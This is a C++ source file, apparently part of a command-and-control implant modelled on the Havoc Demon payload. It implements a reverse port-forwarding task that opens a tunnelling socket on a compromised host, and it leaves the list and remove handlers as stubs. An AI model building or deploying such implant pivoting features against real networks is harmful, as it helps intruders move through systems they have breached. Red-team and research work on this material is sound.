#include "core/task.hpp"

namespace Task
{
    // Reference:
    // https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Socket.c#L59
    std::wstring RportfwdAdd(
        State::PState pState,
        const std::wstring& wLIP,
        const std::wstring& wLPort,
        const std::wstring& wFwdIP,
        const std::wstring& wFwdPort
    ) {
        DWORD dwLIP = Utils::Convert::IPv4ToDWORD(wLIP);
        DWORD dwLPort = Utils::Convert::WstringToDWORD(wLPort, 10);
        DWORD dwFwdIP = Utils::Convert::IPv4ToDWORD(wFwdIP);
        DWORD dwFwdPort = Utils::Convert::WstringToDWORD(wFwdPort, 10);

        Socket::PSOCKET_DATA pSocket = Socket::NewSocket(
            SOCKET_TYPE_REVERSE_PORT_FORWARDING,
            dwLIP,
            dwLPort,
            dwFwdIP,
            dwFwdPort,
            0
        );

        // Set the socket to current state.
        pState->pSocket = pSocket;

        return L"Success: rportfwd socket started.";
    }

    std::wstring RportfwdLs(State::PState pState)
    {
        return L"Warn Not implemented yet.";
    }

    std::wstring RportfwdRm(
        const std::wstring& wIP,
        const std::wstring& wPort
    ) {
        return L"Warn: Not implemented yet.";
    }
}